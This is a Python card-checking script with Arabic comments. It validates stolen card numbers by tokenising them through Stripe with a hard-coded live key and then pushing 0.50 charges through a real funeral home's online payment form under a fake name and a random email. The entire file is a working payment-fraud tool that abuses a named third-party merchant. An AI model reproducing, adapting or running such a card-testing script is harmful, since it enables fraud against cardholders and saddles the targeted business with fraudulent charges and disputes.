import requests
import random

def Tele(ccx):
    try:
        # تجهيز البيانات
        ccx = ccx.strip()
        try:
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3]
        except:
            return "❌ Format Error! Use: CC|MM|YY|CVV"
        
        if "20" in yy and len(yy) == 4:
            yy = yy.split("20")[1]
        
        random_amount1 = random.randint(1, 4)
        random_amount2 = random.randint(1, 99)
        email = f'Waiyan{random_amount1}{random_amount2}@gmail.com'

        # استخدام Session لحفظ الاتصال
        session = requests.Session()

        # -----------------------------------------------
        # الخطوة 1: إنشاء التوكن (Stripe Token)
        # -----------------------------------------------
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        }
        
        data = f'type=card&billing_details[name]=Waiyan&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51IGU0GIHh0fd2MZ32oi6r6NEUMy1GP19UVxwpXGlx3VagMJJOS0EM4e6moTZ4TUCFdX2HLlqns5dQJEx42rvhlfg003wK95g5r'
        
        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        # [تصحيح الخطأ]: التحقق من وجود ID قبل القراءة
        if 'id' not in r1.text:
            try:
                error_msg = r1.json()['error']['message']
                return f"Stripe Error: {error_msg}"
            except:
                return "Stripe Connection Error"
        
        pm = r1.json()['id']

        # -----------------------------------------------
        # الخطوة 2: الدفع (Charge)
        # -----------------------------------------------
        headers = {
            'authority': 'www.corriganfunerals.ie',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.corriganfunerals.ie',
            'referer': 'https://www.corriganfunerals.ie/pay-funeral-account/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wp_full_stripe_inline_donation_charge',
            'wpfs-form-name': 'pay-funeral-account',
            'wpfs-form-get-parameters': '%7B%7D',
            'wpfs-custom-amount': 'other',
            'wpfs-custom-amount-unique': '0.50',
            'wpfs-donation-frequency': 'one-time',
            'wpfs-custom-input[]': ['Waiyan', 'Waiyan', 'Waiyan'],
            'wpfs-card-holder-email': email,
            'wpfs-card-holder-name': 'Waiyan',
            'wpfs-stripe-payment-method-id': pm,
        }
        
        r2 = session.post('https://www.corriganfunerals.ie/cfajax', headers=headers, data=data)
        
        # [تصحيح الخطأ]: التحقق من نوع الرد لتجنب error string indices
        try:
            response_json = r2.json()
            
            # حالة 1: الرد عبارة عن نص وليس قاموس (هنا كان يحدث الخطأ)
            if isinstance(response_json, str):
                return f"Website Error: {response_json}"
            
            # حالة 2: الرد يحتوي على رسالة
            if 'message' in response_json:
                return response_json['message']
            
            # حالة 3: نجاح
            elif 'success' in response_json and response_json['success'] == True:
                return "Approved ✅"
                
            else:
                return r2.text # إرجاع النص الخام للمعاينة
                
        except Exception:
            return "Declined (Unknown Response)"

    except Exception as e:
        return f"System Error: {e}"
